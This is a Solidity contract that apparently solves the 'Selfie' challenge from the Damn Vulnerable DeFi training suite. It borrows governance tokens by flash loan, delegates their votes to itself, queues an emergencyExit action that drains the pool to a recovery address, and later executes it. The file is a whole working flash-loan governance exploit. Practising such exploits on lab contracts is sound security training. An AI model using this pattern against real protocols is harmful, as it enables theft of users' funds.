// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {ERC20Votes} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Votes.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";

contract Attacker is IERC3156FlashBorrower, Test {
    SelfiePool victim;
    SimpleGovernance governance;
    address recovery;
    DamnValuableVotes dvt;

    constructor(SelfiePool _pool, SimpleGovernance _governance, address _recovery) {
        victim = _pool;
        governance = _governance;
        recovery = _recovery;
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        override
        returns (bytes32)
    {
        ERC20Votes(token).delegate(address(this));
        governance.queueAction(address(victim), 0x00, abi.encodeWithSignature("emergencyExit(address)", recovery));
        ERC20Votes(token).approve(address(victim), ERC20Votes(token).balanceOf(address(this)));
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function attack() public {
        governance.executeAction(1);
    }
}
